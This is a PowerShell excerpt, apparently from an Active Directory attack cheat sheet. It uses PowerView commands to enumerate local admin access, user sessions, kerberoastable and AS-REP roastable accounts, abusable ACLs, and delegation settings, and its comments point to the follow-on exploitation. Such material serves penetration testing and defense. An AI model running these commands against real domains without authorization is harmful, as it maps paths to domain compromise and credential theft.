```powershell
# Find existing local admin access for user (noisy)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```